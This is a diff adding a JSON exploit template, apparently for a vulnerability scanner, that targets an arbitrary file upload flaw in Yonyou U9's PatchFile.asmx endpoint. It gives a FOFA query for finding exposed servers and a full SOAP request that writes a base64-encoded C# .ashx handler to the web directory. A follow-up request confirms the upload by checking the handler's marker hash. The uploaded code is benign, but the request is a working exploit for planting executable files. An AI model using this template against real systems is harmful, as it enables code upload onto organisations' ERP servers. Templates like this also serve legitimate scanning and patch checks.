@@ -1,0 +1,38 @@
+{
+  "product": "用友U9",
+  "vul_name": "用友U9 PatchFile.asmx接口任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友U9聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"logo-u9.png\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486033&idx=1&sn=9871ceeb9777fa646c0de20494af9e69&chksm=974b8756a03c0e401f267c15fd34df9f3ca2bd3a10b87efc707df3b4677f60157207c8c72178&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/CS/Office/AutoUpdates/PatchFile.asmx",
+      "header": {
+        "SOAPAction": "\"http://tempuri.org/SaveFile\""
+      },
+      "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n   <SaveFile xmlns=\"http://tempuri.org/\">\n    <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoIjk1Y2M2NGRkMjgyNWY5ZGYxM2VjNGFkNjgzZWNmMzM5Iik7IAogICAgICAgIH0gCiAgICB9</binData>\n    <path>./</path>\n    <fileName>52e039302a62d077.ashx</fileName>\n   </SaveFile>\n  </soap:Body>\n </soap:Envelope>"
+    },
+    "verify": {
+      "method": "get",
+      "path": "/CS/Office/AutoUpdates/52e039302a62d077.ashx",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
